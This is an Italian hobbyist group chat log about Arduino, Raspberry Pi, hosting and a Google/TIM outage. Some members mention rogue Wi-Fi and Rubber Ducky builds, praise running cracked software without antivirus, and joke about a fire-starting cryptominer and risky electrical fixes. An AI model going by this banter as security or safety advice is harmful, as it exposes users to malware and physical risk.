forse anche io B+ non ricordo ora controllo
No model B senza +
Lo vedi subito perché quello nuovo è molto diverso, ha placchette metalliche in giro
direi che non è quello nuovo
Sbaglio o a livello di condensatori ecc. È più pulito?
Perché dovrebbe?
Se vuoi spegnilo ma non vedo perché si debba rompere
Quello vecchio disse il tecnico che si ruppe per questo
Si accendeva e subito spegneva
Bah
Come componentistica è circa identico
Gli mancano le tonnellate di scritte bianche piccoline tipiche del raspi
Io non ci credo molto ma mio padre ha paura e stacca anche la presa della corrente
sono famoso per le mie sintesi comprensibili
E ovviamente ha la parte per il PoE che è tantissima roba
La GPU è spostata su quello nuovo
Ci sono 4 PIN sul nuovo
dipende dall'età..se ha oltre 80 anni si, potrebbe essere
Sono i ponticelli per il PoE

sto cercando di installare questi driver sul node mcu esp8266
Non ti so aiutare scus 
Il mio liceo è stato fondato nel 1950 ma non da zero. Da quel che ho capito è un distaccamento di un Liceo Classico fondato nel 1870 in cui dovrebbero avere anche loro uno scheletro vero
non ti preoccupare grazie!
Che devo fare 
Cambiare cell
Ho risposto sopra
🆘🆘🆘Un INFO PLease!!! Sapete dirmi come modificare la grafica del display in Marlin? Esiste un sito o un programma che possa fare questo?🆘🆘🆘🆘
Ma un nome decente no?
Poi se qualcuno va a vedere il mio estratto conto mi prende per culo
Grazie quella Delle foto non è una brutta idea
Per la SD ce l'ho già ed è pure vuota solo che non mi fa spostare più niente
Ho lasciato solo la cartella "Android"
Mi sa che passo foto e formatto tutto 
qualcuno ha stampato tramite easyeda e/o sa se c'è la dogana, superati i 20$?
🤔allora si, potrebbe essere decisamente vero
prima di tutto caricare la batteria
Questo è un bin, non è un driver
si
È come caricare uno sketch precompilato
usalo come fermacarte
I driver li devi scaricare tu
si si ora mi sono letto bene tutto il pippone
è molto meglio 

Stasera vieni a fare una partita?
se volete un nova 2 per finta ok
perché sono gn2 ma è da tempo che non mi alleno seriamente
Ragazzi qualcuno conosce il sensore magnetico hmc5883 gy 273?
Mmm... Potremmo fare uno strappo alla regola e assumere un nabbetto...
Cos’è?
"Board" corrisponde a "Scheda"
Cambia il Baud Rate...escludo sia bruciato
Power over Ethernet
Alimentare dispositivi (come telecamere di sorveglianza) via cavo ethernet senza aver bisogno di alimentazione separata
Sto progettando una "Wifi Pineapple DIY"
Solo che non ho capito se il raspi sarebbe il master o lo slave
Ragazzi dite che è fattibile una cosa così? L'ho disegnato io.
Si poi ho risolto, era quello
Non pensavo fosse quello visto che il codice lo ho preso su internet, e al proprietario funzionava
Potresti usare un Arduino Mega,  che è provvisto di più pin, anzichè utilizzare due Arduino Uno
Lo so ma volevo fare tutto con solo quello che ho in casa senza comprare nulla. A casa ho tre Arduino uno è un Arduino mini, volevo fare tutto con quelli.
È il progetto per un veicolo radiocomandato con una braccio al di sopra
Potresti eliminare il 2°Arduino, guadagnando 3 pin sul primo, mettendo gli Enable pin dell'L298N, direttamente nel 5V e sfruttando anche i pin Tx ed Rx
Nn ci avevo pensato grz.
E se devi far girare i motori in un solo verso è sufficiente un solo pin input per motore su L298N (solo IN1, IN3)
Grz per il consiglio. Faccio un po' di calcoli e poi vedo

ragazzi! potete consigliarmi un buon prog per videoediting??? non come sony vegas,o cyberlink,qualcosa piu leggero
raga,perche dice che sto youtube adblock e pericoloso?
e gratuito?
Hai scaricato l'estensione da Chrome oppure un programma normale?
non so. io ho solo l'estensione adblock plus nel google che blocca la pubblicita. non ricordo che ho provato a installare YT adblocker
okay
I russi
cioe non e full disponibile?
No, ma è più instabile
Io, però per la dogana non so
ok .-.
Raga sapete a chi appartiene questo logo (scusate la mia ignoranza )
eh il mio pc e 32 bit..(quindi gg?)
Ma le altre due finestre aperte?
sono proprio altre cose 
Eh lo so
OMG
Ahahah
tanta  ma non la faccio da un bel po .-.
scarico tanti prog crackati,e prima avevo una merda tipo il mio antivirus..
Domanda stupidissima...non ti conviene comprare una scheda per controllare tutti quei servo... risparmi un Arduino...?
vai tranquillo che non ti fermano niente, poi di solito i negozianti cinesi dichiarano sempre meno
io scarico da anni programmi crackati senza AV ed ognittanto uso un rescue disk per scansionare ed esce pulito
tu si che fortunato
si vado a culo
perchè dal taskmgr me ne accorgo subito
a me ha seccato il fatto che tutto bello nel internet non e gratuito ed e cosi costoso da non immaginare...
ad esempio quella volta che ho preso il virus dell'autoproxy ho fixato tutto da regedit senza antivirus
e che virus era?🤔
invece il pc del mio amico infettato esattamente come era il mio con l'av mi ha bloccato tutto e ho dovuto formattare
lol
inseriva nelle config di sistema un proxy che bloccava l'accesso da chrome, o meglio , doveva spiare la connessione  ma dato che i programmatori di quel coso sono ritardati la bloccava completamente
con firefox però andava
perchè ha la gestione indipendente dei proxy
raga cosa cambia tra cuffiette normali e cuffiette dual driver?
tipo quelle che ha fatto xiaomi?
Quindi doppiamente ritardati
wow dai ora che parli dei virus mi piace di nuovo il 
Realizzato...
funziona meglio il malware di zeb che leva adblock e ne blocca l'installazione da tutti i browser
ma lo stesso non capisco perche la gente non fa dei 
 alposto di virus di merda per i bimbi
 
sarebbero belli,no?  sopratutto cacciare quei virus dal pc
si sarebbe divertente
qualcuno sa come evitare che la cinghia dell'asse y slitti?
 LOL
ma zeb non sarebbe il youtuber super famoso che bestemmia? se si allora e cosi cretino che manda dei virus alla gente?
Quello che dice eh volevi
Ciao adesso sarò attivo
Mi consigliate di aprire un canal e Youtube?
Non so mi ispira
Dipende... Hai una buona disponibilità economica per attrezzarti? Pensi di farlo seriamente?
Io ho già l'attrezzatura e penso di essere costante
Il casino è scegliere il format
Allora prova...
Ormai la rete è satura di youtuber ed è difficile distinguersi
Perchè gaming non mi piace assolutamente, il mondo di Arduino è molto interessante ma devo informarmi di più per aprire un canale visto che i tutorial di 
 sono arrivato al 4 e poi non  mi veniva niente anche se continuavo a provare
Ragazzi, sono alle basi di arduino. Se mi servono piu GND come faccio?
Vps consigliata per il gaming?
 
.
grz
Credo che cambi la gestione del suono
dal nome credo che a differenza delle normali stereo 2.0 ci siano 2 driver per ogni cuffia per un totale di 4 altoparlanti
 dove lo lasciamo? E' uno dei migliori nel settore gaming con le sue VPS black
Come pezzi?
No. Lagga tantissimo se sotto DDOS
Sono buoni
Cazzata
L muort
Costano più di tutti
Evopvp
Ho esperienze in hosting da 5 anni.
Vedi tu
1. Non significa un cazzo
2. Ci lavoro
3. Ho un VPS da loro
Ahhhh
Adesso ci capiamo
Lo stai sponsorizzando 
Nope
Dico le cose come sono
Ho 7 vps in totale e 3 dedicati
Saprò ?
Se vuoi ti invio gli screen di tutti
Se ci esci il codice sconto ti faccio la recensione 
Lol
ho 47 vps
deal with it
Ma chi ti crede?!
era abbastanza ironico
Seee
Credici...
Hai subito l'asportazione del rene e del polmone?
Hahaha
Ho 80 dedicati!
Grazie al cazzo 
no ho venduto l'iphone x
stessa cosa praticamente
Ah cambia tutto allora
Lol
Ok, almeno stai bene
Ma con che cosa l'hai comprato l'iPhone X? 
ragazzi una buona fonte per imparare il python
anche non italiana ovviamente
Il sito
Mica tanto
Su YouTube
Se vuoi ho anche un libro per bambini di 10 anni che sto usando
Più chiaro di così si muore 
Pure lui fratello lo capirebbe con quello
non avevo pensato a github :O
Grazie per avermi cacato ☺️
non voglio cose per bambini ahhaha
sono in grado di capire cose avanzate :P
grazie del consiglio anyway
Okay
Adesso ti passo il libro da 219 e ossa pagine
Con tanto di storia su python
magari quella la salto ahahha
Ehhh
La quale lunga 100 pagine
Vuoi i video?
iniziero dopo la sessione di aprile, niente fretta
In realtà giusto la parafrasi
no ti prego
E allora attaccati 
mi attacco a github
Lo so ma il mio obbiettivo era nn spendere soldi e utilizzare solo quello che ho già a casa mia
.
Una breadboard(?)
ok scrivmi in privato che ti mando dopo una foto
De che?
lo scoprirai
voi conoscevate 
 ????
non c'entra un cazzo
la qualità di worldongames è superiore
partendo dal fatto che virtualizza con KVM e non OpenVZ
No
WOG é per piccoli server, nabbi
quando hanno aperto EvoPvP continuava a laggare perchè l’antiddos da skifoh
 vieni su cs fra 10 minuti?
Mica siete gli unici eh. Anche gamehosting utilizzo KVM
AHAHAHAHA
Per le vps winzozz
GH usa OpenVZ per le altre che personalmente è una nota dolente
quanti anni hai?
Cosa ti interessa?
Lo so
Sapere con chi sto parlando
Rhosting è buono
Ovvio
14, non giudicare una persona dall’età
:)
Non giudico nessuno perchè abbiamo la stessa età
Lol
Ma evidentemente non hai capito qualcosa
LoL
Nah
Ero in ts con quelli di Evo
Ma siamo tutti coetanei allora
Lo so quello che è successo
nessuno?
Rip
Avevano problemi di attacchi di bot per problemi loro, il proxy (bungee) si riempiva di richieste e crashava solo perchè loro erano stati incapaci a settarlo a dovere. Il VPS girava tranquillo.
Non diciamo che è un problema dell'host se alla fine è un problema di bungeecord che crasha
per favore...
Ma quindi te collabori con il servizio vps no? Come hai fatto a iniziare a collaborare? Di cosa ti occupi?
Mi occupo di WebDevelopment, collaboro e ho iniziato grazie ad un loro progetto di integrare persone per fare progetti alternativi, poi sono stato "assunto". Ovvio che siamo più che altro un gruppo di "amici" quindi non siamo in un ambito professionale.
Quindi questo gruppo di amici è aperto a fare nuove conoscenze?
Se a scopo di avere VPS gratis (cosa che non avrai mai), nope
Neanche io la ho a gratis
Ma è giusto così
Ma chi ha chiesto la vps?!
Ah boh allora parla con 
No, sarei interessato a fare qualcosa di produttivo nella mia vita
basta che tu sappia cosa vuoi fare e che non verrai pagato
Già la sua bio dice molto
No, tranquillo
Ma cosa fate di preciso?
E' simpatico, sì
Programmiamo il sito migliorandolo attualmente
Poi assistenza e cose ordinarie
Ah, rip
Sono fermo a py
fuck the police
Ma le VPS per i giochi, hanno il lato server pre-installato? Ad esempio, un server minecraft
Abbiamo i multicraft per chi vuole il preinstallato
Ovvio che i VPS non esistono solo per minecraft
 sbloccate 
 che si è sbagliato
Altrimenti create una sistema a Droplet che preinstalla qualcosa dall'inizio (App Django, Laravel, NodeJS, ecc...)
Chiedi direttamente a Emanuele
Per avere tutto configurato
Ma io non sono mod
Lel
Ci sta
con python penso sia fattibile
Ema se vuoi presenta l'idea a WoG
Sei mod
Magari 
solo helper
E se ti dicessi che sono nello spogliatoio della palestra completamente *non vestito, ecco*
è un si?
Ah rip 
Wait, quale framework utilizzate?
Escilo
linux 
Lavori per un hosting?
Ehm, Django, Flask, ecc...
diciamo di si
Link
Se intendi per il sito usiamo php
Il mio massimo del lavoro è rompere il cazzo ai miei...può valere come lavoro?
penso di si
Mai sentito
Io sono sempre rimasto fedele a OVH lel
Allora lavoro da 14anni 24/7
Productive
Tranne per il nuovo server che dobbiamo aprire, l'altro founder ha deciso di prenderlo su rhosting perché hosta in Italia
Sempre
Mmm
scaleway? e poi lo installate voi il server
Guarda che è un vps game
i7 8700k, 16GB DDR4 e 150GB di storage (NVMe della Samsung)
Ma a voi funzia Google?🤔
cazzo no
manco a me
ma che cazz sta succedendo, pensavo fosse il mio modem che fa brutti scherzi con internet
coooooosaaaa????
Neanche a me funzionava
Altra sparatoria di una vegane crudista?
ma ora?
???!?!?!?!
Tipo l'ho chiesto
yep
Però pensavo di essere preso per il culo
a me non va ora
ora vedo
Quindi ho eliminato il messaggio
Ao basta spammare, calmatevi 
Comunque mi sono disconnesso da internet e mi sono riconnesso
mi sta esplodendo il telefono di notifiche
Bene
tu non capisci.... è l'apocalisseeeeeeee
No
hey, dobbiamo fuggire, google è down, le spie russe ci cercano, presto, nella mia irc
DDoS google 
infartooo
ESISTE ANCORA??
porca troia se non esiste
basta che accendo il rasp
Spie russe = giulian
ma a me va
Secondo me dipende dai dns
anche a me va comunque 🤔

gg
Io sapevo che non dovevo entrare nel Pentagono✖️
non so se sia un ddos pesante, anche se dubito, avranno dei problemi decnici con qualcosa
Che rete hai?
Comunque il ping mi funziona
Se mi connetto con vpn funzia perfettamente
Quindi🤷‍♂
?
150ms di ping
Tim, Fastweb, Tiscali
il dns di google(
) è on, pingandolo mi da risposta
C'è un bot su TG per YouTube in MP3?
telecom
:




:




:

oooooo Google aked

Ah ecco è un problema di telecom
Tim merdaaa
unknown host è brutale
Dove guardo i video di 
  adesso
da noi telecom è la migliore, tutte le altre fanno schifissimo, solo che io ho il modem che da problemi, devo farmelo cambiare
Up
Vabbè perché sto bot è tipo offline
ANCH'IO
Comunque
ciao papà
È un problema di telecom
Cambiate i DNS con 
 e risolvete
io ho telecom e va
ho 
 e 
YouTube va?
da noi o hai la fibra che va bene circa a tutti o con la dsl fa schifo a chiunque
mettiamo tutti i dns dei russi
Vabbè da PC anche io ho i DNS google
yup
ed io ho la dsl
A me no

Comunque 
 funziona
Coincidenze?
Io non credo
grazie, uso lui
va anche yt
Si ma è colpa dei DNS di default degli android suppongo
Da dove lo cambi su smartphone
Se hai i root puoi cambiarli
Da Cell va da pc no
Ecco
A me no
io sono su pc
E non va?
Google è down
Da cell continua ad andare
A me su pc Google va
Chi ha Twitter?
confermo, down anche da me
Lanciamo l'hashtag
vedi che i rumeni in nord hanno visto i cavi di internet e se li sono presi
Domande dell'universo...Quando si può usare la frase "So programmare in ..."? 
Quando posso dire di sapere un linguaggio ?
Io ho questo sticker, ma non so di cosa sia ahaha
quando riesci a fare le cose complesse e poi, lasciandolo 2 giorni li senza toccarlo, ti sei dimenticato tutto
e poi passi a java di processing
Saper fare copia incolla da esempi generali conta???
Con dns 
 funziona

Classico, c'è un motivo se esistono i commenti
Yeeeeee
Ma il ping funziona
No, per niente
uHuH aKeR
Ai am a aker
ok è ripartito con 
 ora a me
Tutto tornato alla normalità
ma a me è sempre funzionato🤣🤣🤣
o porccc
AH
anche a me
solo noi in tutto il mondo
non funzionava neanche con quello
cosa è andato down?
 qua dice
a però
il server stesso dice
È stato un metodo di 
 per sponsorizzare il DNS
Lol
da quel che dicono in questo articolo molto poco affidabile, i problemi sono partiti a mezzogiorno circa, poi si sono diffusi un po' ovunque in italia fino a prendere quasi tutti, essenzialmente il server ha dato segni di cedimento, troppo tempo per una risposta, si...tipo ddos praticamente, anche se non era voluto :/
per me sono stati i tecnici della scuola
Cis

 


 e i relativi servizi associati risultano al momento parzialmente irraggiungibili dall’Italia - 

Ah lol non avevo letto 
è Tim che è down
Google funziona benissimo
Tim e telecom
Sembra un offesa 
non posso cambiare i termini globali dell'informatica eh
Lo so 
Io ho tim a casa
E Google va 
cos
più che altro sarebbe un bel casino se contemporaneamente andassero down sia duduckgo che google
io non navigherei più per un po'
non hai una VPN aperta?
Nope
boh allora mi sa che mi devo ricredere(?) o magari è tornato online
nel dubbio sti cazzi, a me funziona tutto perfettamente
Same here, dovrebbe non funzionare?
Cosa sono page 4 e page 5?
Anche a me funziona
 Ehi dovete fixare l'anteprima delle scritte che escono, probabilmente è colpa di Filippo che non ha ancora impostato gli header ☺️
Su Spotify mod funziona Spotify connect?
Segnalazioni blog é in riunione al momento. Può lasciare un messaggio in segreteria e risponderemo entro 24 mesi. Grazie.
dalla regia mi dicono in poco tempo
Ma mmm nella FAQ avevate scritto 24 ore... siete dei falzi!!1!!11!11
Si ma siccome il blog ha ancora qualche buco... Come i formaggi, e quindi si misura in mesi ora
Buonasera, stavo leggendo delle recensioni Amazon di varie chiavette USB e vedo questa... L'utente lascia una stella solo perché ha perso la chiavetta, subito segnalato...
Ah 
Conosco il genere di recensione, sul play store é pieno di coglioni così
Adesso mi dovrei autowarnare per i termini
Ahahah stavo pensando proprio a questo 
Ok, posso installarla sul TV box cinese
Credevo che non funzionasse
Realizzato V2
Oke
Mi sto divertendo a fare cose a caso
L’outpout del raspberry é 5V solo che non sapevo come mettere la ventola a 3,5V quindi uso L’Arduino. Si poteva fare con dei piccoli collegamenti al RASP
Ahahahah 
Qualcuno riesce a scrivermi un codice in modo che:
Ogni minuto la ventola si accende per un minuto e poi si spegne. Dopo un minuto di riaccende per un minuto...
Per favore help
Mi puoi aiutare?
Per favore
Okk
60 sec
Riusciresti a farmelo per favore?
Si 5
Ok
Qualcuno che mi aiuta a farlo?
Allora provo a fartelo io sul telefono ma non ti assicuro nulla dato che non posso provarlo
Okk tranqui. Grazie mille lo stesso
Finito
Ho usato una ide di arduino per telefono 
Spero sia corretto
 ha funzionato?
Grazie
Cosa?
ora provo
.
Yes
funziona perfettamente. Grazie mille!
Prego
hai ios o android?
Android
ahh
Domani mi complico la vita mettendo anche un termostato
In modo che quando riceve una determinata temperatura si accende
Solo io ieri sera sono stato costretto a usare Bing perché Google era Down ?
nope
ma era un problema solo italiano e solo della Telecom
A ok
Buongiorno
'Giorno 
Non è troppo difficile
Raga i terroristi non hanno pensato,di fare un super miner che alzerà cpu 100% e creerà dei incendi  che ne dite? Li suggerisco?
Si può
Faree
LoL
Meglio usare i vs o i vultek
o gli itek
Anche
ma la piastra per i servo non dovresti collegarla ad arduino dai 5v?
te hai messo 12v ma arduino ne regge 5
Le forbici in stile 
Ehm
STAVO SU INSTAGRAM
Da quando Instagram attiva servizi in abbonamento
Lol
Da quando non chiedi al tuo operatore di attivare il blocco
se chiami se è la prima volta che succede di solito te li ridanno
Infatti
Traduzione di merd
Buongiorno a tutti
Concordo
Ogni tanto scopro funzioni di Windows a caso
Propongo un plebiscito popolare per rimuovere quel bot
CONCORDO
NON SA TRADURRE
HAI FATTO LA DOCCIA AHHAHAHAHA
Buongiorno, volevo qualche chiarimento sulla Rubber Ducky,
Io ho acquistato quella che aveva linkato OverVolt, ma quando la collego al pc o al Mac non la legge, è mi da sempre problemi.
In più quando si copia un payload qualsiasi, ank “hello world” da github/hack5 e lo si mette 
 per tradurlo
In linguaggio arcuino, al debug Continua a dare errori... come è che nel video gli funziona tutto liscio?
Sisi stamattina
DigiSpark o Arduino?
Digispark
A me capisce subito
Sì dipende un sacco da come parli
Quelli di 
 e 
 non si capisce una mazza
Eh si, devi dire solo quello che scriveresti senza quelle cose che si dicono nel parlato, e non deve esserci rumore
E devi scandire perfettamente
Scattata da iPhone 6 hahaha
si è la stessa mia... ma e riguardo agli erro che da nel traduttore da ducky a arduiono?
Vediamo se capisce...

Boh comunque era stata linkata una scheda che non era quella del video...
Uh


trovato una mezza soluzione da studiarsi 
Devi prima premere il tasto Upload sull'Ide e poi inserire la RubberDucky entro il countdown 
Che è di 60 secondi
Cosa?
Il countdown
Entro il quale inserire la digispaspark
Ah
Guardate qua 
 
 NON È POSSIBILE haahhaahahshahahahahah 
vai, abbiamo trovato cosa fargli tracciare
Ahahahhahahaahahah la comodità...
Hahaha l'entusiasmo sincero
Fa troppo smattare quel pezzo di video
Ora ci faccio una YT pup
Correttore di m
Anche il video dell’FPV dove dici che se vai a kilometri di distanza prende la rai

raga
Im a youtuber: no non l’avrei mai detto!
come posso modificare i options di visual studio 2015 per vedere il numero della riga?
Posso farla?
Impostazioni?
si....avevo dimenticato quella dannata parola ahahha
Ah
Mmmm non ho visual studio 2015
Php 
Ooo
Uuuu
Su le maniiiii
Ora faccio una yt pup su OverVolt
Perché hai cancellato il nome utente? 
Non c’è solo quello....
:)
Hahahah ha
Ahn ahahahahahah capito
L'unica cosa a cui serve arduino
che roba è?
Un Arduino usato come programmatore ISP

Non stavo scherzando
È l'unico utilizzo che conosco per quei sei PIN centrali
lol
È una mega citazione
Per quello è scritto Im e non I'm
 quando vuoi far fare amicizia fra la cr10 e Arduino
  quando il cell ti trolla
Fantastico vero?
È il pesce di aprile di Lineage
Che bello🤪 peccato la abbia installata il 4

Fantastico insomma, ha installato una app e c'è una notifica che manco posso togliere
Eeeeeh
citazione a Casey
Salve
Ciao
Ciao benvenuto!
Niente di meno ma non bastano i dissipatori
Cioè parliamo di un single board computer non scalda tanto
Come fai ad avere il numero di romboli?
Se google andasse down significa che la fine del mondo è vicina
Non ha il numero
Ha censurato il nickname
Ah
-.-
Chi te lo dice?
Che violenza...
La foto stessa, sarebbe stata più grande la censura
Nope
Il testo è grande uguale
Eh vabbè chissene se ha il numero di marco.. Un sacco di gente lo ha
Ma io no
Per perché uno dovrebbe averlo soprattutto
Magari erano all’asilo insieme

Ma ???
ODDIO
Un overVolt mini
Ahahahhahahahh
Usava già Raspberry per comandare i compagni
Anche Arduino
??
Wft
è una mano
Un pollo
Hahah si
Già programmava
LoL
È un orsetto

Ragazzi ma controllando 5 stepper con un arduino mega i motori girano lentissimi
Perchè ad ogni ciclo arduino deve scrivere in digitale ogni passo di ogni motore
È normale o c’è qualcosa di sbagliato?
Arduino due
È più potente?
Già
E con questo si riesce?
ha una cpu a 32bit
non lo ho, ma lo utilizzano per cose più esose di risorse computazionali...
e dovresti cercare di ridurre al minimo i microstep 
Che tipo di audio è?
Fare 4 passi invece di 8?
meno ne fai meno operazioni deve fare...
era una centralina per luci stroboscobiche che ora non funziona
e vorrei utilizzare il triac per fare la stessa cosa
Sera ragazzi, una domanda
É possibile effettuare un input in un if?
(C)
Ma cosa usi per pilotarli?
Uln2003
Ah ma dai impulso per impulso?!
Si purtroppo
Ma prendi 5 driver per gli stepper...
Ma sono gli stepper piccoli che ci sono nei kit
Non so se facciano i driver per quelli
cos'è?
Un robottino che ti porta la birra

Sono bipolari o unipolari?
Unipolari
quello che avevi proposto tu, il robot porta-birra hahahahaha
fiiiigooi
Ma come li alimenti?
Con l’uln2003 a 12v
seeeeeeee
aspè.... chi hanno preso l'idea 🤔
Ah ok pensavo dicessi direttamente da arduino
L’uln200 è praticamente un insieme di transistor che aprono il gate quando c’è tensione sui pin che arrivano da arduino
Tensione presa esternamente
Pensavo avessi una ramps  con dei nema
Non so cosa sia
È quello del kit... Lo ho a 5V io mi sembra
Esatto
Ma regge fino a 12v surriscaldandosi un po’
Ah nono
beh allora un arduino 2 è costoso per il progetto XD
Provo ad utilizzare degli arduino nano come driver
Che comunichino con il mega principale che gli dice cosa fare
ma perché devi utilizzare quegli stepper?
Perchè ho questi e altri sono troppo pesanti, sto facendo un braccio robotico
e perché utilizzi degli stepper e non dei servo?
Perchè i servo non sono così potenti
E sono più costosi
avrei detto il contrario :D
Ragazzi qualcuno potrebbe spiegarmi come funzionano ora gli # su Instagram?
Mi danno problemi con il nuovo profilo aziendale mentre con l'account personale non ho nessun tipo di problematica, è necessario un numero minimo di follower?
Che problemi?
Inserito un hashtag andando poi a cercarlo non compare la foto tra le "più recenti"
Ragazzi come posso azzerare una variabile di tipo char in c?
char v = 0;
Ehm, ci avevo pensato
Ma
Se mi servisse lo 0?
Non c'è un modo per farlo?
Ci metti un valore che non ti serve
Ci sono rimasto malissimo hahahah
Comunque grazie
Più easy del previsto
Però non funziona ancora :/
Non capisco dov'è l'errore, chiunque voglia aiutarmi, libero di farlo ^^
Ps. So che ci sono mille modi di farlo meglio ma devo attenermi al programma svolto quest'anno, quindi posso usare solo questi pochi comandi
Non funziona non significa niente
(Ovvero che non mi ""attiva"" l'input , il secondo)
Perché scanf ti frega
L'input termina sempre con \n
Quindi se prendi un solo carattere rimarrai nella coda l'enter
Che sarà preso al sucessivo scanf
In genere quando non si preleva anche l'enter si pulisce il buffer
Quindi l'errore è nella tabulazione?
solo perchè hai scritto questo ^-^ , io ora gli do un'occhiata
Devo essere più friendly possibile hahahha


 chiama questa funzione subito dopo ogni chiamata a scanf
Aspetta
É la funzione di input quella, giusto?
Esempio:

scanf("%c",&tipo);
mypurge();
if ( tipo == 'v'){
  ...
}
...
Ora provo e ti dico, comunque grazie mille
non è magari anche con gli if() e i float? almeno, in cpp è un casino disumano mettere un float dentro un if() perchè te lo da sempre sbagliato se non aggiungi un offset
Si, anche quello è errato
Ah approposito, devo richiamare qualche libreria?
Con il codice che ti ho dato no
 non si confrontano mai delle variabili float
== è da scordarselo sui double e sui float
E allora aspetta
<= >= < > ok
beh nel caso...c'è pure math su C? si può usare un piccolo offset di 0.01 tipo e usare fabsf()
Io come posso far capire al programma che la bottiglia deve essere in uno dei due materiali?
È meglio non usarlo
a beh, se non può usare oltre perchè non l'ha ancora studiato non si può fare
Appesantisci il codice mi sa
beh devi includere tutta un'altra libreria solo per quello effettivamente
scanf("%c",&tipo);
mypurge();
switch ( tipo ){
  case 'p': puts("plastica");break;
  case 'v': puts("vetro");break;
  default: puts("materiale sconosciuto");
}
...
Non posso usare switch.. È qui il problema
Comunque grazie mille raga
Ed è così che ho fatto
compito di scuola?
Si
ahhh
teoricamente succede agli account privati
Non è privato, sicuramente non è stato segnalato per spam e non è stato pubblicato nulla di offensivo/non pubblicabile. Infatti non capisco..
allora non saprei proprio
🤔
devo trovare una canzone scritta in bpm metronomo
50ShadesOfPing che ricordii
Quando entra nei server americani e il server si trasforma in un server italiano
Vero lol
Che poi tutti chiedono uno screen
L'utilità..?
... quando ci sono le fotografie agli schermi
Ho creato un app con App inventor, però non mi rileva i dispositivi bluetooth... Volevo collegarlo con Arduino, ma con Bluetooth Terminal funziona
Qualche idea?
When You forget to reference your stylesheets 
 
 
  
LOL

ma why?
quanti cps hai?
pochi, sono fuori allenamento da 2 anni
tipo 8/9 comunque
5.6 non riesco a passare oltre...
che click hai?
fast o jitter?
normal lol non sono un alieno come quelli che con butterfly o jitter raggiungono il 20cps
uno ha fatto spinner click e ha raggiunto 40 cps ahhah
se quel server vale per MC crackato posso giocare con voi,ovviamente se non state su skype .-.
è pvptemple
il server di Feryzz
okay,non so chi e ma ok 
se ora puoi/potete giocare posso venire,se no dopo dimentico del server,perche di solito gioco in un solo server
il server non è cracked
ah
why a mee tutto cio che faccio chiede soldi,solo visual studio ,il mio libro,miei amici e il launcher non vogliono dei soldi 
Quando stai cercando la canzone per un timelapse e trovi quella perfetta 
ed è anche il momento in cui capisci di aver esagerato avendo 10 clips da 1h ciascuna
Complimenti, io ho il problema opposto, cerco una canzone carica per svegliarmi un po' la sera e mi ritrovo solo alternative rock

Quando in tutti i modi non devo dimenticarmi di installare premiere la prossima volta che mi trovo col Wi-Fi
Scritto piccolo
Perché non hai il wiif
Vivo di fianco una cabina di abbassamento della tensione elettrica, l'inquinamento elettrico è talmente forte da non permettere il wifi
Balle, aspetto la fibra e non ho soldi
Ma wtf
Io ho l'Enel accanto, fai te 
in realtà è tutta una scusa per dire che i suoi non vogliono
Cioè non ha internet
Oh scherzavo riguardo la centrale
sattoh
Mi pareva strano
Cioè ok l'inquinamento elettromagnetico ma mi pareva un po' esagerato
poi vedi che appena esce di casa si ritrova i russi con in mano un cannone emp puntato verso la porta di casa
Zero russi nel nostro stato indipendente
sparano a vista in dogana la da te?
No, abbiamo sostituito la vodka con l'amarone, niente più richiami naturali e i russi sono migrati naturalmente verso terre più prolifere

È normale che dopo una settimana e mezza un ordine su GearBest non sia ancora stato spedito?
Il tuktuk!!!
È una figata
H4cked
In che senso
Ce ne ho una perfetta
Appena mi viene in mente il titolo ovviamente
Tobu - Something Right (Instrumental Mix)
nah
Beh, io l'ho sentita la prima volta in un timelaps e ci stava da dio
mhhh
Anche il video é fatto da dio a dire la verità
Madonna che figata di video 
Appena monto il proiettore 4k lo vedo
Ragazzi ho bisogno di una tua consulenza 
Vorrei lasciare raspberry e un po' di Arduini vari accesi 24/7 per un giorno nasconderli nel muro. So che lavorando a 5V il rischio è molto basso, ma come posso fare a mettere in sicurezza tutti i circuiti in modo che qualsiasi cosa succeda non abbia alcun danno?
Probabilmente è una domanda stupida ma "Security is number one priority"
In che senso danno?
Per il raspy c'è il case apposito
Per un Arduino dipende se sopra ci hai messo delle shields
Non so, che danni posso avere al massimo con picchi di corrente o averli accesi tutto il giorno tutti i giorni?
Non capisco che intendi xD che danni vuoi che faccia
Non so, se va in corto o c'è un picco di tensione non c'è rischio che si crei qualche fiammellina o nemmeno quella?
Fiammellina se prende fuoco la tenda che hai accanto
Nop
5v non fanno neanche uno schioppo
Al massimo si sente odore di silicio bruciato
Ma proprio se ti va male
Cercavo un modo in cui una fiammellina anche tipo questa sia completamente isolata dal resto in modo da rischiare zero


Ma grazie, con 650ma
Sono nella tua stessa situazione
I picchi di tensione aumentano il 
 non l' 
Non rischi nulla
Eh lo so, era un esempio, io sono stra ansioso, vorrei che fosse troppo sicuro
Per arrivare a 650ma devi attaccarci la 220 diretta in pratica xD
Questa è paranoia
Non sicurezza
Ma anche se succedesse
è alimentato a 15V e cortocircuitato praticamente
Ma poi non prenderebbe fuoco nulla perché 

Eh xD
se lo alimenti a 5V quel regolatore di tensione manco viene utilizzato
.-.
?
Hai ragione pure te, e sì, son paranoico
vallo a dire quando prendevono fuoco tutti i cavi della 22o per un corto ahahah
Poi ti ritrovi un picco che va a 19000 volt e ti ritrovi il plasma sulla scrivania
Ok...
Shhhh zitto che già è paranoico di suo
Gg
La parte di ferro è rimasta dentro la presa 
AHAHAHAHAHAHAHAHAHAHAHAHAHAHA
Anche a me è successo una volta
Non sai le bestemmie
Cacciala via con le dita 


Succede
Dopo aver staccato la corrente al blocco, secuwity is numbew one pwiowity
Con delle pinze di ferro
Gianluca plasma lo chiamavano
Ahahaha
Esagerato ridici su
L'importante è quello 
Come l'hai tolto?
Con un trasformatore per l'alta tensione
Sicuro 
Cambiando spina
🤪
Ma la cosa strana è un altra
Fondendolo
Eh
Non chiedetemi come, ma è finita dietro la mascherina del buco
Non si vede 
Ggggggg
Appunto
Ah ma quindi è finita sotto? 
(prima si vedeva, poi per sbaglio l'ho spinto dentro )
Si.
🤦‍♂
Com'è che sei vivo?
Avevo staccato la corrente
Ho spento qualsiasi cosa con scritto camera per sicurezza
Facevi prima a chiudere il salvavita xD
Ho chiuso il salvavita infatti
Nel quadro elettrico
No dicevo a farlo saltare xD
Ah
No, forse non mi conveniva 
di rame
Stagno
naah
Con il flessibile 
ma l'impugnatura è in plastica
non è abbastanza rischioso
Ahahah
Platino
Ma con il flessibile lo faccio uscire velocemente
CON UNA TSAR
vedi che la esce
ignoro le proprietà del platino
Oddio che è una tsar
Credo che sia tipo il più conduttore tra i metalli xD
Bomba atomica + bomba h
La prima innesca la seconda
